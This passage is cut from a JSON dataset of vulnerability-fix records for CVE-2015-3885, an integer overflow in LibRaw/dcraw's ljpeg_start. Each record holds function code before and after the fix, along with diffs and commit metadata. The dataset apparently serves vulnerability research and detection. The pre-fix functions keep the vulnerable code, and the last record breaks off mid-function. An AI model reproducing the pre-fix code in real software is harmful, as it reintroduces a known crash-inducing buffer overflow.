jh->huff[1+c] = jh->huff[0];\n  }\n  jh->row = (ushort *) calloc (jh->wide*jh->clrs, 4);\n  merror (jh->row, \"ljpeg_start()\");\n  return zero_after_ff = 1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,7 @@\n int CLASS ljpeg_start (struct jhead *jh, int info_only)\n {\n-  int c, tag, len;\n+  int c, tag;\n+  ushort len;\n   uchar data[0x10000];\n   const uchar *dp;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "  int c, tag, len;"
            ],
            "added_lines": [
                "  int c, tag;",
                "  ushort len;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3885",
        "func_name": "LibRaw/bad_pixels",
        "description": "Integer overflow in the ljpeg_start function in dcraw 7.00 and earlier allows remote attackers to cause a denial of service (crash) via a crafted image, which triggers a buffer overflow, related to the len variable.",
        "git_url": "https://github.com/LibRaw/LibRaw/commit/4606c28f494a750892c5c1ac7903e62dd1c6fdb5",
        "commit_title": "0.16.1: fix for dcraw ljpeg_start() vulnerability",
        "commit_text": "",
        "func_before": "void CLASS bad_pixels (const char *cfname)\n{\n  FILE *fp=NULL;\n#ifndef LIBRAW_LIBRARY_BUILD\n  char *fname, *cp, line[128];\n  int len, time, row, col, r, c, rad, tot, n, fixed=0;\n#else\n  char *cp, line[128];\n  int time, row, col, r, c, rad, tot, n;\n#ifdef DCRAW_VERBOSE\n  int fixed = 0;\n#endif\n#endif\n\n  if (!filters) return;\n#ifdef LIBRAW_LIBRARY_BUILD\n  RUN_CALLBACK(LIBRAW_PROGRESS_BAD_PIXELS,0,2);\n#endif\n  if (cfname)\n    fp = fopen (cfname, \"r\");\n#line 4151 \"dcraw/dcraw.c\"\n  if (!fp)\n      {\n#ifdef LIBRAW_LIBRARY_BUILD\n          imgdata.process_warnings |= LIBRAW_WARN_NO_BADPIXELMAP;\n#endif\n          return;\n      }\n  while (fgets (line, 128, fp)) {\n    cp = strchr (line, '#');\n    if (cp) *cp = 0;\n    if (sscanf (line, \"%d %d %d\", &col, &row, &time) != 3) continue;\n    if ((unsigned) col >= width || (unsigned) row >= height) continue;\n    if (time > timestamp) continue;\n    for (tot=n=0, rad=1; rad < 3 && n==0; rad++)\n      for (r = row-rad; r <= row+rad; r++)\n\tfor (c = col-rad; c <= col+rad; c++)\n\t  if ((unsigned) r < height && (unsigned) c < width &&\n\t\t(r != row || c != col) && fcol(r,c) == fcol(row,col)) {\n\t    tot += BAYER2(r,c);\n\t    n++;\n\t  }\n    BAYER2(row,col) = tot/n;\n#ifdef DCRAW_VERBOSE\n    if (verbose) {\n      if (!fixed++)\n\tfprintf (stderr,_(\"Fixed dead pixels at:\"));\n      fprintf (stderr, \" %d,%d\", col, row);\n    }\n#endif\n  }\n#ifdef DCRAW_VERBOSE\n  if (fixed) fputc ('\\n', stderr);\n#endif\n  fclose (fp);\n#ifdef LIBRAW_LIBRARY_BUILD\n  RUN_CALLBACK(LIBRAW_PROGRESS_BAD_PIXELS,1,2);\n#endif\n}",
        "func": "void CLASS bad_pixels (const char *cfname)\n{\n  FILE *fp=NULL;\n#ifndef LIBRAW_LIBRARY_BUILD\n  char *fname, *cp, line[128];\n  int len, time, row, col, r, c, rad, tot, n, fixed=0;\n#else\n  char *cp, line[128];\n  int time, row, col, r, c, rad, tot, n;\n#ifdef DCRAW_VERBOSE\n  int fixed = 0;\n#endif\n#endif\n\n  if (!filters) return;\n#ifdef LIBRAW_LIBRARY_BUILD\n  RUN_CALLBACK(LIBRAW_PROGRESS_BAD_PIXELS,0,2);\n#endif\n  if (cfname)\n    fp = fopen (cfname, \"r\");\n#line 4152 \"dcraw/dcraw.c\"\n  if (!fp)\n      {\n#ifdef LIBRAW_LIBRARY_BUILD\n          imgdata.process_warnings |= LIBRAW_WARN_NO_BADPIXELMAP;\n#endif\n          return;\n      }\n  while (fgets (line, 128, fp)) {\n    cp = strchr (line, '#');\n    if (cp) *cp = 0;\n    if (sscanf (line, \"%d %d %d\", &col, &row, &time) != 3) continue;\n    if ((unsigned) col >= width || (unsigned) row >= height) continue;\n    if (time > timestamp) continue;\n    for (tot=n=0, rad=1; rad < 3 && n==0; rad++)\n      for (r = row-rad; r <= row+rad; r++)\n\tfor (c = col-rad; c <= col+rad; c++)\n\t  if ((unsigned) r < height && (unsigned) c < width &&\n\t\t(r != row || c != col) && fcol(r,c) == fcol(row,col)) {\n\t    tot += BAYER2(r,c);\n\t    n++;\n\t  }\n    BAYER2(row,col) = tot/n;\n#ifdef DCRAW_VERBOSE\n    if (verbose) {\n      if (!fixed++)\n\tfprintf (stderr,_(\"Fixed dead pixels at:\"));\n      fprintf (stderr, \" %d,%d\", col, row);\n    }\n#endif\n  }\n#ifdef DCRAW_VERBOSE\n  if (fixed) fputc ('\\n', stderr);\n#endif\n  fclose (fp);\n#ifdef LIBRAW_LIBRARY_BUILD\n  RUN_CALLBACK(LIBRAW_PROGRESS_BAD_PIXELS,1,2);\n#endif\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -18,7 +18,7 @@\n #endif\n   if (cfname)\n     fp = fopen (cfname, \"r\");\n-#line 4151 \"dcraw/dcraw.c\"\n+#line 4152 \"dcraw/dcraw.c\"\n   if (!fp)\n       {\n #ifdef LIBRAW_LIBRARY_BUILD",
        "diff_line_info": {
            "deleted_lines": [
                "#line 4151 \"dcraw/dcraw.c\""
            ],
            "added_lines": [
                "#line 4152 \"dcraw/dcraw.c\""
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3885",
        "func_name": "LibRaw/parse_kodak_ifd",
        "description": "Integer overflow in the ljpeg_start function in dcraw 7.00 and earlier allows remote attackers to cause a denial of service (crash) via a crafted image, which triggers a buffer overflow, related to the len variable.",
        "git_url": "https://github.com/LibRaw/LibRaw/commit/4606c28f494a750892c5c1ac7903e62dd1c6fdb5",
        "commit_title": "0.16.1: fix for dcraw ljpeg_start() vulnerability",
        "commit_text": "",
        "func_before": "void CLASS parse_kodak_ifd (int base)\n{\n  unsigned entries, tag, type, len, save;\n  int i, c, wbi=-2, wbtemp=6500;\n  float mul[3]={1,1,1}, num;\n  static const int wbtag[] = { 64037,64040,64039,64041,-1,-1,64042 };\n\n  entries = get2();\n  if (entries > 1024) return;\n  while (entries--) {\n    tiff_get (base, &tag, &type, &len, &save);\n    if (tag == 1020) wbi = getint(type);\n    if (tag == 1021 && len == 72) {\t\t/* WB set in software */\n      fseek (ifp, 40, SEEK_CUR);\n      FORC3 cam_mul[c] = 2048.0 / get2();\n      wbi = -2;\n    }\n    if (tag == 2118) wbtemp = getint(type);\n    if (tag == 2130 + wbi)\n      FORC3 mul[c] = getreal(type);\n    if (tag == 2140 + wbi && wbi >= 0)\n      FORC3 {\n\tfor (num=i=0; i < 4; i++)\n\t  num += getreal(type) * pow (wbtemp/100.0, i);\n\tcam_mul[c] = 2048 / (num * mul[c]);\n      }\n    if (tag == 2317) linear_table (len);\n    if (tag == 6020) iso_speed = getint(type);\n    if (tag == 64013) wbi = fgetc(ifp);\n    if ((unsigned) wbi < 7 && tag == wbtag[wbi])\n      FORC3 cam_mul[c] = get4();\n    if (tag == 64019) width = getint(type);\n    if (tag == 64020) height = (getint(type)+1) & -2;\n    fseek (ifp, save, SEEK_SET);\n  }\n}\nint CLASS parse_tiff_ifd (int base)\n{\n  unsigned entries, tag, type, len, plen=16, save;\n  int ifd, use_cm=0, cfa, i, j, c, ima_len=0;\n  int blrr=1, blrc=1, dblack[] = { 0,0,0,0 };\n  char software[64], *cbuf, *cp;\n  uchar cfa_pat[16], cfa_pc[] = { 0,1,2,3 }, tab[256];\n  double cc[4][4], cm[4][3], cam_xyz[4][3], num;\n  double ab[]={ 1,1,1,1 }, asn[] = { 0,0,0,0 }, xyz[] = { 1,1,1 };\n  unsigned sony_curve[] = { 0,0,0,0,0,4095 };\n  unsigned *buf, sony_offset=0, sony_length=0, sony_key=0;\n  struct jhead jh;\n#ifndef LIBRAW_LIBRARY_BUILD\n  FILE *sfp;\n#endif\n\n  if (tiff_nifds >= sizeof tiff_ifd / sizeof tiff_ifd[0])\n    return 1;\n  ifd = tiff_nifds++;\n  for (j=0; j < 4; j++)\n    for (i=0; i < 4; i++)\n      cc[j][i] = i == j;\n  entries = get2();\n  if (entries > 512) return 1;\n  while (entries--) {\n    tiff_get (base, &tag, &type, &len, &save);\n    switch (tag) {\n      case 5:   width  = get2();  break;\n      case 6:   height = get2();  break;\n      case 7:   width += get2();  break;\n      case 9:   if ((i = get2())) filters = i;  break;\n      case 17: case 18:\n\tif (type == 3 && len == 1)\n\t  cam_mul[(tag-17)*2] = get2() / 256.0;\n\tbreak;\n      case 23:\n\tif (type == 3) iso_speed = get2();\n\tbreak;\n      case 36: case 37: case 38:\n\tcam_mul[tag-0x24] = get2();\n\tbreak;\n      case 39:\n\tif (len < 50 || cam_mul[0]) break;\n\tfseek (ifp, 12, SEEK_CUR);\n\tFORC3 cam_mul[c] = get2();\n\tbreak;\n      case 46:\n\tif (type != 7 || fgetc(ifp) != 0xff || fgetc(ifp) != 0xd8) break;\n\tthumb_offset = ftell(ifp) - 2;\n\tthumb_length = len;\n\tbreak;\n      case 61440:\t\t\t/* Fuji HS10 table */\n\tparse_tiff_ifd (base);\n\tbreak;\n      case 2: case 256: case 61441:\t/* ImageWidth */\n\ttiff_ifd[ifd].t_width = getint(type);\n\tbreak;\n      case 3: case 257: case 61442:\t/* ImageHeight */\n\ttiff_ifd[ifd].t_height = getint(type);\n\tbreak;\n      case 258:\t\t\t\t/* BitsPerSample */\n      case 61443:\n\ttiff_ifd[ifd].samples = len & 7;\n\ttiff_ifd[ifd].bps = getint(type);\n\tbreak;\n      case 61446:\n\traw_height = 0;\n\tif (tiff_ifd[ifd].bps > 12) break;\n\tload_raw = &CLASS packed_load_raw;\n\tload_flags = get4() ? 24:80;\n\tbreak;\n      case 259:\t\t\t\t/* Compression */\n\ttiff_ifd[ifd].comp = getint(type);\n\tbreak;\n      case 262:\t\t\t\t/* PhotometricInterpretation */\n\ttiff_ifd[ifd].phint = get2();\n\tbreak;\n      case 270:\t\t\t\t/* ImageDescription */\n\tfread (desc, 512, 1, ifp);\n\tbreak;\n      case 271:\t\t\t\t/* Make */\n\tfgets (make, 64, ifp);\n\tbreak;\n      case 272:\t\t\t\t/* Model */\n\tfgets (model, 64, ifp);\n\tbreak;\n      case 280:\t\t\t\t/* Panasonic RW2 offset */\n\tif (type != 4) break;\n\tload_raw = &CLASS panasonic_load_raw;\n\tload_flags = 0x2008;\n      case 273:\t\t\t\t/* StripOffset */\n      case 513:\t\t\t\t/* JpegIFOffset */\n      case 61447:\n\ttiff_ifd[ifd].offset = get4()+base;\n\tif (!tiff_ifd[ifd].bps && tiff_ifd[ifd].offset > 0) {\n\t  fseek (ifp, tiff_ifd[ifd].offset, SEEK_SET);\n\t  if (ljpeg_start (&jh, 1)) {\n\t    tiff_ifd[ifd].comp    = 6;\n\t    tiff_ifd[ifd].t_width   = jh.wide;\n\t    tiff_ifd[ifd].t_height  = jh.high;\n\t    tiff_ifd[ifd].bps     = jh.bits;\n\t    tiff_ifd[ifd].samples = jh.clrs;\n\t    if (!(jh.sraw || (jh.clrs & 1)))\n\t      tiff_ifd[ifd].t_width *= jh.clrs;\n\t    i = order;\n\t    parse_tiff (tiff_ifd[ifd].offset + 12);\n\t    order = i;\n\t  }\n\t}\n\tbreak;\n      case 274:\t\t\t\t/* Orientation */\n\ttiff_ifd[ifd].t_flip = \"50132467\"[get2() & 7]-'0';\n\tbreak;\n      case 277:\t\t\t\t/* SamplesPerPixel */\n\ttiff_ifd[ifd].samples = getint(type) & 7;\n\tbreak;\n      case 279:\t\t\t\t/* StripByteCounts */\n      case 514:\n      case 61448:\n\ttiff_ifd[ifd].bytes = get4();\n\tbreak;\n      case 61454:\n\tFORC3 cam_mul[(4-c) % 3] = getint(type);\n\tbreak;\n      case 305:  case 11:\t\t/* Software */\n\tfgets (software, 64, ifp);\n\tif (!strncmp(software,\"Adobe\",5) ||\n\t    !strncmp(software,\"dcraw\",5) ||\n\t    !strncmp(software,\"UFRaw\",5) ||\n\t    !strncmp(software,\"Bibble\",6) ||\n\t    !strncmp(software,\"Nikon Scan\",10) ||\n\t    !strcmp (software,\"Digital Photo Professional\"))\n\t  is_raw = 0;\n\tbreak;\n      case 306:\t\t\t\t/* DateTime */\n\tget_timestamp(0);\n\tbreak;\n      case 315:\t\t\t\t/* Artist */\n\tfread (artist, 64, 1, ifp);\n\tbreak;\n      case 322:\t\t\t\t/* TileWidth */\n\ttiff_ifd[ifd].t_tile_width = getint(type);\n\tbreak;\n      case 323:\t\t\t\t/* TileLength */\n\ttiff_ifd[ifd].t_tile_length = getint(type);\n\tbreak;\n      case 324:\t\t\t\t/* TileOffsets */\n\ttiff_ifd[ifd].offset = len > 1 ? ftell(ifp) : get4();\n\tif (len == 4) {\n\t  load_raw = &CLASS sinar_4shot_load_raw;\n\t  is_raw = 5;\n\t}\n\tbreak;\n#ifdef LIBRAW_LIBRARY_BUILD\n      case 325:\t\t\t\t/* TileByteCount */\n          tiff_ifd[ifd].tile_maxbytes = 0;\n          for(int jj=0;jj<len;jj++)\n              {\n                  int s = get4();\n                  if(s > tiff_ifd[ifd].tile_maxbytes) tiff_ifd[ifd].tile_maxbytes=s;\n              }\n\tbreak;\n#endif\n      case 330:\t\t\t\t/* SubIFDs */\n\tif (!strcmp(model,\"DSLR-A100\") && tiff_ifd[ifd].t_width == 3872) {\n\t  load_raw = &CLASS sony_arw_load_raw;\n\t  data_offset = get4()+base;\n\t  ifd++;  break;\n\t}\n        if(len > 1000) len=1000; /* 1000 SubIFDs is enough */\n\twhile (len--) {\n\t  i = ftell(ifp);\n\t  fseek (ifp, get4()+base, SEEK_SET);\n\t  if (parse_tiff_ifd (base)) break;\n\t  fseek (ifp, i+4, SEEK_SET);\n\t}\n\tbreak;\n      case 400:\n\tstrcpy (make, \"Sarnoff\");\n\tmaximum = 0xfff;\n\tbreak;\n      case 28688:\n\tFORC4 sony_curve[c+1] = get2() >> 2 & 0xfff;\n\tfor (i=0; i < 5; i++)\n\t  for (j = sony_curve[i]+1; j <= sony_curve[i+1]; j++)\n\t    curve[j] = curve[j-1] + (1 << i);\n\tbreak;\n      case 29184: sony_offset = get4();  break;\n      case 29185: sony_length = get4();  break;\n      case 29217: sony_key    = get4();  break;\n      case 29264:\n\tparse_minolta (ftell(ifp));\n\traw_width = 0;\n\tbreak;\n      case 29443:\n\tFORC4 cam_mul[c ^ (c < 2)] = get2();\n\tbreak;\n      case 29459:\n\tFORC4 cam_mul[c] = get2();\n\ti = (cam_mul[1] == 1024 && cam_mul[2] == 1024) << 1;\n\tSWAP (cam_mul[i],cam_mul[i+1])\n\tbreak;\n    case 30720: // Sony matrix, Sony_SR2SubIFD_0x7800\n      for (i=0; i < 3; i++)\n        FORC3 cmatrix[i][c] = ((short) get2()) / 1024.0;\n#ifdef DCRAW_VERBOSE\n\tif (verbose) fprintf (stderr, _(\" Sony matrix:\\n%f %f %f\\n%f %f %f\\n%f %f %f\\n\"), cmatrix[0][0],  cmatrix[0][1], cmatrix[0][2], cmatrix[1][0], cmatrix[1][1], cmatrix[1][2], cmatrix[2][0], cmatrix[2][1], cmatrix[2][2]);\n#endif\n\tbreak;\n    case 29456: // Sony black level, Sony_SR2SubIFD_0x7310, needs to be divided by 4\n      FORC4 cblack[c ^ c >> 1] = get2()/4;\n      i = cblack[3];\n      FORC3 if(i>cblack[c]) i = cblack[c];\n      FORC4 cblack[c]-=i;\n      black = i;\n#ifdef DCRAW_VERBOSE\n      if (verbose) fprintf (stderr, _(\"...Sony black: %u cblack: %u %u %u %u\\n\"),black, cblack[0],cblack[1],cblack[2], cblack[3]);\n#endif\n      break;\n      case 33405:\t\t\t/* Model2 */\n\tfgets (model2, 64, ifp);\n\tbreak;\n      case 33422:\t\t\t/* CFAPattern */\n      case 64777:\t\t\t/* Kodak P-series */\n\tif ((plen=len) > 16) plen = 16;\n\tfread (cfa_pat, 1, plen, ifp);\n\tfor (colors=cfa=i=0; i < plen && colors < 4; i++) {\n\t  colors += !(cfa & (1 << cfa_pat[i]));\n\t  cfa |= 1 << cfa_pat[i];\n\t}\n\tif (cfa == 070) memcpy (cfa_pc,\"\\003\\004\\005\",3);\t/* CMY */\n\tif (cfa == 072) memcpy (cfa_pc,\"\\005\\003\\004\\001\",4);\t/* GMCY */\n\tgoto guess_cfa_pc;\n      case 33424:\n      case 65024:\n\tfseek (ifp, get4()+base, SEEK_SET);\n\tparse_kodak_ifd (base);\n\tbreak;\n      case 33434:\t\t\t/* ExposureTime */\n\tshutter = getreal(type);\n\tbreak;\n      case 33437:\t\t\t/* FNumber */\n\taperture = getreal(type);\n\tbreak;\n      case 34306:\t\t\t/* Leaf white balance */\n\tFORC4 cam_mul[c ^ 1] = 4096.0 / get2();\n\tbreak;\n      case 34307:\t\t\t/* Leaf CatchLight color matrix */\n\tfread (software, 1, 7, ifp);\n\tif (strncmp(software,\"MATRIX\",6)) break;\n\tcolors = 4;\n\tfor (raw_color = i=0; i < 3; i++) {\n\t  FORC4 fscanf (ifp, \"%f\", &rgb_cam[i][c^1]);\n\t  if (!use_camera_wb) continue;\n\t  num = 0;\n\t  FORC4 num += rgb_cam[i][c];\n\t  FORC4 rgb_cam[i][c] /= num;\n\t}\n\tbreak;\n      case 34310:\t\t\t/* Leaf metadata */\n\tparse_mos (ftell(ifp));\n      case 34303:\n\tstrcpy (make, \"Leaf\");\n\tbreak;\n      case 34665:\t\t\t/* EXIF tag */\n\tfseek (ifp, get4()+base, SEEK_SET);\n\tparse_exif (base);\n\tbreak;\n      case 34853:\t\t\t/* GPSInfo tag */\n\tfseek (ifp, get4()+base, SEEK_SET);\n\tparse_gps (base);\n\tbreak;\n      case 34675:\t\t\t/* InterColorProfile */\n      case 50831:\t\t\t/* AsShotICCProfile */\n\tprofile_offset = ftell(ifp);\n\tprofile_length = len;\n\tbreak;\n      case 37122:\t\t\t/* CompressedBitsPerPixel */\n\tkodak_cbpp = get4();\n\tbreak;\n      case 37386:\t\t\t/* FocalLength */\n\tfocal_len = getreal(type);\n\tbreak;\n      case 37393:\t\t\t/* ImageNumber */\n\tshot_order = getint(type);\n\tbreak;\n      case 37400:\t\t\t/* old Kodak KDC tag */\n\tfor (raw_color = i=0; i < 3; i++) {\n\t  getreal(type);\n\t  FORC3 rgb_cam[i][c] = getreal(type);\n\t}\n\tbreak;\n      case 40976:\n\tstrip_offset = get4();\n\tload_raw = &CLASS samsung_load_raw;\n\tbreak;\n      case 46275:\t\t\t/* Imacon tags */\n\tstrcpy (make, \"Imacon\");\n\tdata_offset = ftell(ifp);\n\tima_len = len;\n\tbreak;\n      case 46279:\n\tif (!ima_len) break;\n\tfseek (ifp, 38, SEEK_CUR);\n      case 46274:\n\tfseek (ifp, 40, SEEK_CUR);\n\traw_width  = get4();\n\traw_height = get4();\n\tleft_margin = get4() & 7;\n\twidth = raw_width - left_margin - (get4() & 7);\n\ttop_margin = get4() & 7;\n\theight = raw_height - top_margin - (get4() & 7);\n\tif (raw_width == 7262 && ima_len == 234317952 ) {\n\t  height = 5412;\n\t  width  = 7216;\n\t  left_margin = 7;\n          filters=0;\n\t} else \tif (raw_width == 7262) {\n\t  height = 5444;\n\t  width  = 7244;\n\t  left_margin = 7;\n\t}\n\tfseek (ifp, 52, SEEK_CUR);\n\tFORC3 cam_mul[c] = getreal(11);\n\tfseek (ifp, 114, SEEK_CUR);\n\tflip = (get2() >> 7) * 90;\n\tif (width * height * 6 == ima_len) {\n\t  if (flip % 180 == 90) SWAP(width,height);\n\t  raw_width = width;\n\t  raw_height = height;\n\t  left_margin = top_margin = filters = flip = 0;\n\t}\n\tsprintf (model, \"Ixpress %d-Mp\", height*width/1000000);\n\tload_raw = &CLASS imacon_full_load_raw;\n\tif (filters) {\n\t  if (left_margin & 1) filters = 0x61616161;\n\t  load_raw = &CLASS unpacked_load_raw;\n\t}\n\tmaximum = 0xffff;\n\tbreak;\n      case 50454:\t\t\t/* Sinar tag */\n      case 50455:\n\tif (!(cbuf = (char *) malloc(len))) break;\n\tfread (cbuf, 1, len, ifp);\n\tfor (cp = cbuf-1; cp && cp < cbuf+len; cp = strchr(cp,'\\n'))\n\t  if (!strncmp (++cp,\"Neutral \",8))\n\t    sscanf (cp+8, \"%f %f %f\", cam_mul, cam_mul+1, cam_mul+2);\n\tfree (cbuf);\n\tbreak;\n      case 50458:\n\tif (!make[0]) strcpy (make, \"Hasselblad\");\n\tbreak;\n      case 50459:\t\t\t/* Hasselblad tag */\n\ti = order;\n\tj = ftell(ifp);\n\tc = tiff_nifds;\n\torder = get2();\n\tfseek (ifp, j+(get2(),get4()), SEEK_SET);\n\tparse_tiff_ifd (j);\n\tmaximum = 0xffff;\n\ttiff_nifds = c;\n\torder = i;\n\tbreak;\n      case 50706:\t\t\t/* DNGVersion */\n\tFORC4 dng_version = (dng_version << 8) + fgetc(ifp);\n\tif (!make[0]) strcpy (make, \"DNG\");\n\tis_raw = 1;\n\tbreak;\n      case 50710:\t\t\t/* CFAPlaneColor */\n\tif (len > 4) len = 4;\n\tcolors = len;\n\tfread (cfa_pc, 1, colors, ifp);\nguess_cfa_pc:\n\tFORCC tab[cfa_pc[c]] = c;\n\tcdesc[c] = 0;\n\tfor (i=16; i--; )\n\t  filters = filters << 2 | tab[cfa_pat[i % plen]];\n\tfilters -= !filters;\n\tbreak;\n      case 50711:\t\t\t/* CFALayout */\n\tif (get2() == 2) {\n\t  fuji_width = 1;\n\t  filters = 0x49494949;\n\t}\n\tbreak;\n      case 291:\n      case 50712:\t\t\t/* LinearizationTable */\n\tlinear_table (len);\n\tbreak;\n      case 50713:\t\t\t/* BlackLevelRepeatDim */\n\tblrr = get2();\n\tblrc = get2();\n\tbreak;\n      case 61450:\n\tblrr = blrc = 2;\n      case 50714:\t\t\t/* BlackLevel */\n\tblack = getreal(type);\n\tif ((unsigned)(filters+1) < 1000) break;\n\tdblack[0] = black;\n\tdblack[1] = (blrc == 2) ? getreal(type):dblack[0];\n\tdblack[2] = (blrr == 2) ? getreal(type):dblack[0];\n\tdblack[3] = (blrc == 2 && blrr == 2) ? getreal(type):dblack[1];\n\tif (colors == 3)\n\t  filters |= ((filters >> 2 & 0x22222222) |\n\t\t      (filters << 2 & 0x88888888)) & filters << 1;\n\tFORC4 cblack[filters >> (c << 1) & 3] = dblack[c];\n\tblack = 0;\n\tbreak;\n      case 50715:\t\t\t/* BlackLevelDeltaH */\n      case 50716:\t\t\t/* BlackLevelDeltaV */\n\tfor (num=i=0; i < len && i < 65536; i++)\n\t  num += getreal(type);\n\tblack += num/len + 0.5;\n\tbreak;\n      case 50717:\t\t\t/* WhiteLevel */\n\tmaximum = getint(type);\n\tbreak;\n      case 50718:\t\t\t/* DefaultScale */\n\tpixel_aspect  = getreal(type);\n\tpixel_aspect /= getreal(type);\n\tbreak;\n      case 50721:\t\t\t/* ColorMatrix1 */\n      case 50722:\t\t\t/* ColorMatrix2 */\n\tFORCC for (j=0; j < 3; j++)\n\t  cm[c][j] = getreal(type);\n\tuse_cm = 1;\n\tbreak;\n      case 50723:\t\t\t/* CameraCalibration1 */\n      case 50724:\t\t\t/* CameraCalibration2 */\n\tfor (i=0; i < colors; i++)\n\t  FORCC cc[i][c] = getreal(type);\n\tbreak;\n      case 50727:\t\t\t/* AnalogBalance */\n\tFORCC ab[c] = getreal(type);\n\tbreak;\n      case 50728:\t\t\t/* AsShotNeutral */\n\tFORCC asn[c] = getreal(type);\n\tbreak;\n      case 50729:\t\t\t/* AsShotWhiteXY */\n\txyz[0] = getreal(type);\n\txyz[1] = getreal(type);\n\txyz[2] = 1 - xyz[0] - xyz[1];\n\tFORC3 xyz[c] /= d65_white[c];\n\tbreak;\n      case 50740:\t\t\t/* DNGPrivateData */\n\tif (dng_version) break;\n\tparse_minolta (j = get4()+base);\n\tfseek (ifp, j, SEEK_SET);\n\tparse_tiff_ifd (base);\n\tbreak;\n      case 50752:\n\tread_shorts (cr2_slice, 3);\n\tbreak;\n      case 50829:\t\t\t/* ActiveArea */\n\ttop_margin = getint(type);\n\tleft_margin = getint(type);\n\theight = getint(type) - top_margin;\n\twidth = getint(type) - left_margin;\n\tbreak;\n      case 50830:\t\t\t/* MaskedAreas */\n        for (i=0; i < len && i < 32; i++)\n\t  mask[0][i] = getint(type);\n\tblack = 0;\n\tbreak;\n      case 51009:\t\t\t/* OpcodeList2 */\n\tmeta_offset = ftell(ifp);\n\tbreak;\n      case 64772:\t\t\t/* Kodak P-series */\n\tif (len < 13) break;\n\tfseek (ifp, 16, SEEK_CUR);\n\tdata_offset = get4();\n\tfseek (ifp, 28, SEEK_CUR);\n\tdata_offset += get4();\n\tload_raw = &CLASS packed_load_raw;\n\tbreak;\n      case 65026:\n\tif (type == 2) fgets (model2, 64, ifp);\n    }",
        "func": "void CLASS parse_kodak_ifd (int base)\n{\n  unsigned entries, tag, type, len, save;\n  int i, c, wbi=-2, wbtemp=6500;\n  float mul[3]={1,1,1}, num;\n  static const int wbtag[] = { 64037,64040,64039,64041,-1,-1,64042 };\n\n  entries = get2();\n  if (entries > 1024) return;\n  while (entries--) {\n    tiff_get (base, &tag, &type, &len, &save);\n    if (tag == 1020) wbi = getint(type);\n    if (tag == 1021 && len == 72) {\t\t/* WB set in software */\n      fseek (ifp, 40, SEEK_CUR);\n      FORC3 cam_mul[c] = 2048.0 / get2();\n      wbi = -2;\n    }\n    if (tag == 2118) wbtemp = getint(type);\n    if (tag == 2130 + wbi)\n      FORC3 mul[c] = getreal(type);\n    if (tag == 2140 + wbi && wbi >= 0)\n      FORC3 {\n\tfor (num=i=0; i < 4; i++)\n\t  num += getreal(type) * pow (wbtemp/100.0, i);\n\tcam_mul[c] = 2048 / (num * mul[c]);\n      }\n    if (tag == 2317) linear_table (len);\n    if (tag == 6020) iso_speed = getint(type);\n    if (tag == 64013) wbi = fgetc(ifp);\n    if ((unsigned) wbi < 7 && tag == wbtag[wbi])\n      FORC3 cam_mul[c] = get4();\n    if (tag == 64019) width = getint(type);\n    if (tag == 64020) height = (getint(type)+1) & -2;\n    fseek (ifp, save, SEEK_SET);\n  }\n}\n#line 6533 \"dcraw/dcraw.c\"\nint CLASS parse_tiff_ifd (int base)\n{\n  unsigned entries, tag, type, len, plen=16, save;\n  int ifd, use_cm=0, cfa, i, j, c, ima_len=0;\n  int blrr=1, blrc=1, dblack[] = { 0,0,0,0 };\n  char software[64], *cbuf, *cp;\n  uchar cfa_pat[16], cfa_pc[] = { 0,1,2,3 }, tab[256];\n  double cc[4][4], cm[4][3], cam_xyz[4][3], num;\n  double ab[]={ 1,1,1,1 }, asn[] = { 0,0,0,0 }, xyz[] = { 1,1,1 };\n  unsigned sony_curve[] = { 0,0,0,0,0,4095 };\n  unsigned *buf, sony_offset=0, sony_length=0, sony_key=0;\n  struct jhead jh;\n#ifndef LIBRAW_LIBRARY_BUILD\n  FILE *sfp;\n#endif\n\n  if (tiff_nifds >= sizeof tiff_ifd / sizeof tiff_ifd[0])\n    return 1;\n  ifd = tiff_nifds++;\n  for (j=0; j < 4; j++)\n    for (i=0; i < 4; i++)\n      cc[j][i] = i == j;\n  entries = get2();\n  if (entries > 512) return 1;\n  while (entries--) {\n    tiff_get (base, &tag, &type, &len, &save);\n    switch (tag) {\n      case 5:   width  = get2();  break;\n      case 6:   height = get2();  break;\n      case 7:   width += get2();  break;\n      case 9:   if ((i = get2())) filters = i;  break;\n      case 17: case 18:\n\tif (type == 3 && len == 1)\n\t  cam_mul[(tag-17)*2] = get2() / 256.0;\n\tbreak;\n      case 23:\n\tif (type == 3) iso_speed = get2();\n\tbreak;\n      case 36: case 37: case 38:\n\tcam_mul[tag-0x24] = get2();\n\tbreak;\n      case 39:\n\tif (len < 50 || cam_mul[0]) break;\n\tfseek (ifp, 12, SEEK_CUR);\n\tFORC3 cam_mul[c] = get2();\n\tbreak;\n      case 46:\n\tif (type != 7 || fgetc(ifp) != 0xff || fgetc(ifp) != 0xd8) break;\n\tthumb_offset = ftell(ifp) - 2;\n\tthumb_length = len;\n\tbreak;\n      case 61440:\t\t\t/* Fuji HS10 table */\n\tparse_tiff_ifd (base);\n\tbreak;\n      case 2: case 256: case 61441:\t/* ImageWidth */\n\ttiff_ifd[ifd].t_width = getint(type);\n\tbreak;\n      case 3: case 257: case 61442:\t/* ImageHeight */\n\ttiff_ifd[ifd].t_height = getint(type);\n\tbreak;\n      case 258:\t\t\t\t/* BitsPerSample */\n      case 61443:\n\ttiff_ifd[ifd].samples = len & 7;\n\ttiff_ifd[ifd].bps = getint(type);\n\tbreak;\n      case 61446:\n\traw_height = 0;\n\tif (tiff_ifd[ifd].bps > 12) break;\n\tload_raw = &CLASS packed_load_raw;\n\tload_flags = get4() ? 24:80;\n\tbreak;\n      case 259:\t\t\t\t/* Compression */\n\ttiff_ifd[ifd].comp = getint(type);\n\tbreak;\n      case 262:\t\t\t\t/* PhotometricInterpretation */\n\ttiff_ifd[ifd].phint = get2();\n\tbreak;\n      case 270:\t\t\t\t/* ImageDescription */\n\tfread (desc, 512, 1, ifp);\n\tbreak;\n      case 271:\t\t\t\t/* Make */\n\tfgets (make, 64, ifp);\n\tbreak;\n      case 272:\t\t\t\t/* Model */\n\tfgets (model, 64, ifp);\n\tbreak;\n      case 280:\t\t\t\t/* Panasonic RW2 offset */\n\tif (type != 4) break;\n\tload_raw = &CLASS panasonic_load_raw;\n\tload_flags = 0x2008;\n      case 273:\t\t\t\t/* StripOffset */\n      case 513:\t\t\t\t/* JpegIFOffset */\n      case 61447:\n\ttiff_ifd[ifd].offset = get4()+base;\n\tif (!tiff_ifd[ifd].bps && 